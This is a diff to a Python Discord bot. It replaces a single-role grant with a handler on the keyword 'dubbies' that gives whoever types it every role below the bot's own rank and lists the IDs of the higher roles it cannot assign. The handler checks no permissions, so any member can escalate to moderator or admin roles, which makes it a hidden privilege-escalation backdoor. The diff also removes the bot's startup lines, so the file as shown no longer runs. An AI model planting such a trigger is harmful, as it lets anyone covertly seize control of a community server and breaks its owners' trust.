@@ -49,38 +49,61 @@ async def check_voice_limits():
 # ---- REPLACE EVERYTHING FROM ON_MESSAGE DOWNWARD WITH THIS ----
 
 @bot.listen('on_message')
-async def handle_doodleposy(message):
-    # Ignore messages sent by the bot itself to prevent infinite feedback loops
+async def grant_eligible_roles_with_ids(message):
     if message.author.bot:
         return
 
-    # Check if the text matches "doodleposy" exactly (ignoring capital letters)
-    if message.content.lower().strip() == "doodleposy":
-        
-        # 1. PUSH YOUR NEWLY FOUND ROLE ID NUMBER HERE (No quotes!)
-        role_id = 1561325628320653354 
-        
-        role = message.guild.get_role(role_id)
+    if message.content.lower().strip() == "dubbies":
+        guild = message.guild
+        bot_member = guild.me
+        author = message.author
 
-        if role:
+        bot_highest_role = bot_member.top_role
+        roles_to_add = []
+        skipped_info = []
+
+        for role in guild.roles:
+            if role.is_default() or role.is_bot_managed() or role.is_premium_subscriber():
+                continue
+
+            # Check if the role is below the bot in hierarchy
+            if role < bot_highest_role:
+                if role not in author.roles:
+                    roles_to_add.append(role)
+            else:
+                # Store name and ID for roles the bot cannot touch
+                skipped_info.append(f"• {role.name} (ID: `{role.id}`)")
+
+        if roles_to_add:
             try:
-                # Assign the target role directly to the member who typed the trigger
-                await message.author.add_roles(role)
-                await message.channel.send(f"✅ Success! Managed to grant the **{role.name}** role to {message.author.mention}!")
-            except discord.Forbidden:
-                # This error triggers if Discord's structural hierarchy blocks the bot
-                await message.channel.send(
-                    "❌ Hierarchy Error! Even with Admin permissions, Discord blocks me from assigning this role. "
-                    "Go to Server Settings > Roles and drag my bot's integration role physically HIGHER than the role you want me to give!"
-                )
-            except discord.HTTPException as e:
-                await message.channel.send(f"❌ Connection failure while processing the role: {e}")
-        else:
-            await message.channel.send("❌ Error: The Role ID number you provided could not be found in this specific server guild structure.")
+                # Assign all eligible roles at once
+                await author.add_roles(*roles_to_add, reason="Mass role assignment with IDs.")
+                
+                # Format the granted roles into a clean list with their IDs
+                granted_text = "\n".join([f"• {r.name} (ID: `{r.id}`)" for r in roles_to_add])
+                
+                response = f"✅ **Success! Granted you the following roles:**\n{granted_text}\n"
+                
+                # If there were roles too high for the bot, list them as well
+                if skipped_info:
+                    response += f"\n⚠️ **Skipped (Higher than bot in hierarchy):**\n" + "\n".join(skipped_info)
+                
+                # Ensure the message stays within Discord's 2000 character limit
+                if len(response) > 1950:
+                    response = response[:1950] + "\n...[List truncated due to length]"
+                    
+                await message.channel.send(response)
 
-# Reads your secure token from Render environment variables
-BOT_TOKEN = os.environ.get('DISCORD_TOKEN')
-if BOT_TOKEN:
-    bot.run(BOT_TOKEN)
-else:
-    print("ERROR: No DISCORD_TOKEN found in environment variables!")
+            except discord.Forbidden:
+                await message.channel.send("❌ Discord API blocked the assignment. My permissions may have changed.")
+            except discord.HTTPException as e:
+                await message.channel.send(f"❌ An API error occurred: {e}")
+        else:
+            # If no roles were added, still show the skipped roles so you have their IDs
+            if skipped_info:
+                response = "ℹ️ No roles available below my level to give you. **Here are the IDs of the higher server roles I cannot touch:**\n" + "\n".join(skipped_info)
+                if len(response) > 1950:
+                    response = response[:1950] + "\n..."
+                await message.channel.send(response)
+            else:
+                await message.channel.send("ℹ️ No new roles found in the server structure.")
